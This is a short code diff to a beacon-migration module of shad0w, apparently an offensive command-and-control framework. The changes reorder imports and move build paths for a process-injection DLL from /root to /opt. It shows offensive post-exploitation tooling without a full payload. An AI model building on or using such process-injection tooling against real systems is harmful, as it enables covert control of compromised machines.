@@ -2,12 +2,11 @@
 # Migrate the current beacon to a different process
 #
 
-import os
-import json
-import base64
 import argparse
+import base64
+import json
+import os
 import threading
-
 from lib import buildtools
 
 __description__ = "Migrate the beacon to a different process"
@@ -97,11 +96,11 @@ def get_dll_data(file_loc):
 
 def generate_beacon_dll(shad0w, rcode):
     # write header file
-    write_header(rcode, "/root/shad0w/modules/windows/shinject/beacon.h")
+    write_header(rcode, "/opt/shad0w/modules/windows/shinject/beacon.h")
 
     # build the dll
-    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/shinject/", basedir="/root/shad0w/modules/windows/shinject/")
-    made = buildtools.make_in_clone(modlocation="/root/shad0w/modules/windows/shinject/module.dll", builddir=os.getcwd(), make_target="x64")
+    buildtools.clone_source_files(rootdir="/opt/shad0w/modules/windows/shinject/", basedir="/opt/shad0w/modules/windows/shinject/")
+    made = buildtools.make_in_clone(modlocation="/opt/shad0w/modules/windows/shinject/module.dll", builddir=os.getcwd(), make_target="x64")
 
     # check that the dll has built
     if made != True:
@@ -109,7 +108,7 @@ def generate_beacon_dll(shad0w, rcode):
         return
 
     # return the base64 dll data
-    return get_dll_data("/root/shad0w/modules/windows/shinject/module.dll")
+    return get_dll_data("/opt/shad0w/modules/windows/shinject/module.dll")
 
 def await_impersonate(shad0w, pid):
     while True:
